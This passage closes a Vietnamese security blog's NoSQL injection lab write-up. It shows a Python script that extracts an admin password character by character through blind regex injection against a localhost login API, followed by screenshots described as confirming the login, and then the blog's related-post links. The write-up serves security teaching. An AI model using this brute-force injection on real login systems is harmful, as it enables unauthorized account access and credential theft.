+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080/api/challenge3/login&quot;</span></span><br><span class="line">password_length = <span class="number">56</span> </span><br><span class="line">known_password = <span class="string">&quot;&quot;</span></span><br><span class="line">charset = string.ascii_letters + string.digits + <span class="string">&quot;_-&quot;</span> <span class="comment"># Bộ ký tự để đoán</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vòng lặp để tìm từng ký tự của mật khẩu</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(password_length):</span><br><span class="line">    <span class="comment"># Vòng lặp để thử từng ký tự trong bộ ký tự</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        guess = known_password + char</span><br><span class="line">        </span><br><span class="line">        payload_regex = guess + <span class="string">&quot;.*&quot;</span></span><br><span class="line">        </span><br><span class="line">        json_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: payload_regex&#125;</span><br><span class="line">        response = requests.post(url, json=json_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            known_password = guess</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Tìm thấy ký tự tiếp theo: <span class="subst">&#123;known_password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nKhai thác hoàn tất! Mật khẩu là: <span class="subst">&#123;known_password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/Bkl5zg-6ee.png" alt="image"></p>
+<p>Thành công dump ra password bây giờ ta sẽ thử đăng nhập xem liệu password này có đúng hay không.</p>
+<p><img src="https://hackmd.io/_uploads/HyZ6MgZaee.png" alt="image"></p>
+<p>Đăng nhập thành công với password trên vậy nên ta đã khai thác thành công Blind NoSQLi bằng kĩ thuật Regex Injection.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-10-06-NoSQL-Injection-Lab/">https://pzhat.github.io/2025/11/15/2025-10-06-NoSQL-Injection-Lab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-10-09-Web-Cache-Deception/" title="Web Cache Deception Demo Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Web Cache Deception Demo Lab</div></div><div class="info-2"><div class="info-item-1">Web Cache Deception Demo LabTổng quan Web Cache DeceptionLỗ hổng “web cache deception” (đánh lừa bộ nhớ đệm web) là một dạng lỗ hổng bảo mật web, cho phép kẻ tấn công lừa hệ thống cache (bộ nhớ đệm web) lưu trữ và phục vụ lại những nội dung nhạy cảm hoặc riêng tư cho các bên không được ủy quyền. Đây là một hình thức khai thác sự khác biệt trong cách các server cache và server gốc xử lý các request—đặc biệt là về quy tắc lưu cache cho các tài nguyên động (như trang tài khoản người dùng, trang ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-23-SSRF-Challenge/" title="Server Side Request Forgery (Java)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Server Side Request Forgery (Java)</div></div><div class="info-2"><div class="info-item-1">Server Side Request Forgery (Java)Source CodeGithub: https://github.com/pzhat/SSRF_vuln_demo What is SSRFGiới thiệu về Server-Side Request Forgery :  Chúng ta có xu hướng lơ là, mất cảnh giác khi đang trong vùng an toàn  → Developer nghĩ rằng hacker sẽ không truy cập được các ứng dụng nội bộ do đó việc bị hack gần như là không thể → Pentester cũng không đủ thời gian để security test hết tất cả dịch vụ nội bộ → Khả năng tìm ra lỗi trên các dịch vụ nội bộ sẽ rất cao nếu ”lẻn” vào được bên trong...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Sql-Injection/" title="Java Servlet Sql Injection Vulnerability by @Phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Sql Injection Vulnerability by @Phatmh</div></div><div class="info-2"><div class="info-item-1">Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+---src   +---main      +---java         +---sql_injection             +---controller             +---dao             +---model             +---util      +---resources         +---META-INF      +---webapp          +---WEB-INF   +---test       +---java       +---resources+---target    +---classes    ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">A blog about cybersecurity, hacking, pentesting, red teaming and more.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NoSQL-Injection-Vulnerability-Challenge-Java"><span class="toc-number">1.</span> <span class="toc-text">NoSQL Injection Vulnerability Challenge Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-ve-NoSQL-Injection"><span class="toc-number">1.1.</span> <span class="toc-text">Tổng quan về NoSQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">1.2.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-challenge"><span class="toc-number">1.3.</span> <span class="toc-text">Tổng quan challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Khai-thac-va-POC"><span class="toc-number">1.4.</span> <span class="toc-text">Khai thác và POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">Challenge 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Challenge 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-3-Blind-NoSQLi"><span class="toc-number">1.4.3.</span> <span class="toc-text">Challenge 3 (Blind NoSQLi):</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)">Ired.Team Kerberoasting (Credential Access)</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab">Ired.Team Kerberos Golden Tickets Lab</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge">Tryhackme Basic Pentesting Challenge</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst">Ysoserial Commons Collections 5 Analyst</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps">PortSwigger CSRF Challenge WriteUps</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
